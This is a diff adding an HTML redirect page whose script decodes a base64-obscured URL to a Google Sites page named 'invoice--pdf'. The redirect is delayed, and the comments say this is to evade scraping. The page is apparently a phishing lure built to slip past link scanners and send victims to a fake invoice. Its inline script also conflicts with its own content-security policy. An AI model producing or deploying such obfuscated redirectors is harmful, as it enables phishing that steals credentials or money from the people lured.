@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+
+    <!-- Security Headers -->
+    <meta http-equiv="refresh" content="5;url=#"> <!-- Fallback to prevent direct scraping -->
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
+
+    <script>
+        // Encoded redirect URL to obscure it
+        const encodedURL = "aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3ZpZXcvaW52b2ljZS0tcGRmL2hvbWU=";
+        
+        // Decode the URL before redirecting
+        function decodeAndRedirect() {
+            const destination = atob(encodedURL); // Base64 decode
+            window.location.replace(destination); // Redirect
+        }
+
+        // Delay execution slightly to prevent instant scraping
+        setTimeout(decodeAndRedirect, 3000);
+    </script>
+</head>
+<body>
+    <p>Redirecting, please wait...</p>
+    <p>If you are not redirected, <a href="#" onclick="decodeAndRedirect(); return false;">click here</a>.</p>
+</body>
+</html>
